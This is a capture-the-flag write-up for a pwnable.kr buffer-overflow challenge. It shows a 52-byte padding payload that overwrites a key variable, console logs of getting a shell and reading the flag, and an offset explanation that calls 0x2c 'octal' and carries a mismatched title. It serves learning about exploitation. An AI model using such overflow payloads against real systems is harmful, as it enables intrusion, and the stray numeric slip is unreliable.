# Pwnable.kr 01-FD writeup
U have 2 way to get a flag.

If u type 1, It will go to interactive shell

If u type 2, It will get flag automatically

```
[+] Opening connection to pwnable.kr on port 9000: Done
[*] payload is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe?
[?] if u want interactive shell press 1 , if u want flag press 2 :   1
[*] Switching to interactive mode
$ cat flag
daddy, I just pwned a buFFer :)
```

```
[+] Opening connection to pwnable.kr on port 9000: Done
[*] payload is : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe?
[?] if u want interactive shell press 1 , if u want flag press 2 :   2
[+] Receiving all data: Done (32B)
[*] Closed connection to pwnable.kr port 9000
daddy, I just pwned a buFFer :)
```
# What I used?
In code, 
` char overflowme[32]; ` and I need to change key variable `0xdeadbeef` to `0xcafebabe` So I need to overflow the buffer.  So I make a 52 dummy `A` and insert `p32(0xcafebabe)` . 

#But why 52 dummy char?
I think memory struct will

`key variable(0xdeadbeef) | RET | SFP | dummy(?) | overflowme array(32byte)`
if u see the binary with gdb, key variable is at ebp+8 and overflowme array start at ebp+0x2c.

0x2c by octal number is 44

44 + 8 is 52.

So dummy char should 52.


# same exploit with explanation 
blog.hanukoon.com

